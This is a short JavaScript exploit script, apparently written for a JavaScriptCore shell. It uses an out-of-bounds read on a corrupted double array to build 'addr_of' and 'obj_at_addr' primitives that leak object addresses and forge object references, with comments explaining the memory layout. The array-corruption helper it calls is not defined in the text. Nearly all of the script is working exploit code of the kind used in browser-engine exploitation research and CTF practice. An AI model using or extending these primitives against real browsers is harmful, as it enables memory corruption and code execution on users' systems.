load("/home/ubuntu/int64.js")

let hax_array = new Array(5);
hax_array.fill(1.1); // ArrayWithDoubles
corrupt_array_length(hax_array); // Set up OOB Read

// ArrayWithContiguous
let target_array = new Array(5);
target_array[1] = [];

// Above explained
/* The hax array has an OOB read so you put the target_array right after it 
 * This allows you to read the reference pointer from target_array 
 * Using int64.from_double will give you the pointer addres
 */

function addr_of(target_object) {
    target_array[0] = target_object;
    return Int64.from_double(hax_array[6]);
}

function obj_at_addr(target_address){
	hax_array[6] = target_address.to_double();
	return target_array[0];
}

let o = {};
print(describe(o))
// Object: 0x7feeaf0b8080 with butterfly...
print(addr_of(o))
// 0x00007feeaf0b8080
//
//
let some_object = {};
print("some object described");
print(describe(some_object));
print("some object via oob read");
print(addr_of(some_object));
